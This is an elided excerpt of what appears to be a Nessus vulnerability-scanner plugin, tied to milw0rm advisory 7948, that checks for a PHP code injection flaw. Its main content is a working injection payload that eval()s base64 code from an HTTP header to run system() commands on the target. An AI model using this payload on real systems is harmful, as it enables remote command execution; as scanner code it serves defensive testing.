...
if (description)
{
  ...
  script_xref(name:"milw0rm", value:"7948");
  script_xref(name:"OSVDB", value:"51727");
...
foreach dir (dirs)
{
  ...
  var = string("NESSUS_CMD");
  exploit = string(
    "1');",
    "eval(base64_decode($_SERVER[HTTP_", var, "]));//"
  );
  ...
  req = http_mk_get_req(
    port        : port,
    item        : url, 
    add_headers : make_array(var, base64(str:string("echo '", sep, "\n';system('", cmd, "');echo '", sep, "\n';")))
  );
